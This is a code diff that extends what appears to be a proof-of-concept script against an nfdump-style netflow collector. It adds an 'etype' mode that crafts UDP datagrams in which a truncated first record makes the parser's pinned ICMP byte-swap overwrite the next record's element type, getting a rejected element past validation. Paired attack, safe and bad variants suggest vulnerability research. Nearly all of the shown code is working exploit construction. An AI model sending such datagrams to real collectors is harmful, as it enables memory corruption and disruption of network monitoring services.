@@ -109,6 +109,42 @@ def hdr_datagram(first):
                         1764000000, 1, 2) + body
 
 
+ETYPE_BAD = 43        # >= MAXEXTENSIONS: VerifyV3Record rejects this type
+ETYPE_LEN = 257       # low byte 1 -> pinned genericFlow->proto == IPPROTO_ICMP
+
+
+def etype_datagram(first, nfversion=1):
+    """Aim the pinned ICMP swap at record 2's ELEMENT TYPE.
+
+    Record 1 is 46 bytes: 12-byte header + truncated EXgenericFlow (20) +
+    14-byte dummy. Its flow view starts at record1+16, so srcPort lands at
+    record2+10 (record 2 flags/nfversion), dstPort at record2+12 (the
+    element type) and proto at record2+14 (element length low byte, 1).
+    The pinned swap byte-swaps flags/nfversion into the element type and
+    zeroes flags/nfversion. Record 2's wire element type is always 43
+    (rejected); only the crossing write can make it 1 (accepted).
+    """
+    flow = bytearray(generic_flow(5, 500))
+    flow.extend(bytes(ETYPE_LEN - ELEM_HDR.size - len(flow)))
+    victim = (REC_HDR.pack(V3_RECORD, REC_HDR.size + ETYPE_LEN,
+                           1, 0, 0, 0, 0, nfversion)
+              + ELEM_HDR.pack(ETYPE_BAD, ETYPE_LEN) + bytes(flow))
+
+    if first == "attack":
+        elems = ((EX_GENERIC_FLOW, 20, b"\x11" * 16),
+                 (DUMMY_TYPE, 14, bytes(10)))
+    else:
+        elems = ((EX_GENERIC_FLOW, EX_SIZE, generic_flow(3, 180)),)
+
+    body = REC_HDR.pack(V3_RECORD, REC_HDR.size + sum(e[1] for e in elems),
+                        len(elems), 0, 0, 0, 0, 3)
+    for etype, elen, p in elems:
+        body += ELEM_HDR.pack(etype, elen) + p
+    body += victim
+    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
+                        1764000000, 1, 2) + body
+
+
 def edge_datagram():
     """Fill a maximum IPv4 UDP payload (65507 B) with a 4-byte flow element last.
 
@@ -145,6 +181,10 @@ def datagram(mode):
         return alias_datagram("attack" if mode == "alias" else "safe")
     if mode in ("hdr", "hdr-safe"):
         return hdr_datagram("attack" if mode == "hdr" else "safe")
+    if mode in ("etype", "etype-bad", "etype-safe"):
+        return etype_datagram(
+            "safe" if mode == "etype-safe" else "attack",
+            43 if mode == "etype-bad" else 1)
     if mode == "edge":
         return edge_datagram()
     if mode == "edge-safe":
@@ -178,7 +218,8 @@ def main():
     ap.add_argument("port", type=int)
     ap.add_argument("mode", choices=("attack", "safe", "icmp", "single",
                                      "alias", "alias-safe", "hdr", "hdr-safe",
-                                     "edge", "edge-safe"))
+                                     "edge", "edge-safe",
+                                     "etype", "etype-bad", "etype-safe"))
     a = ap.parse_args()
     pkt = datagram(a.mode)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
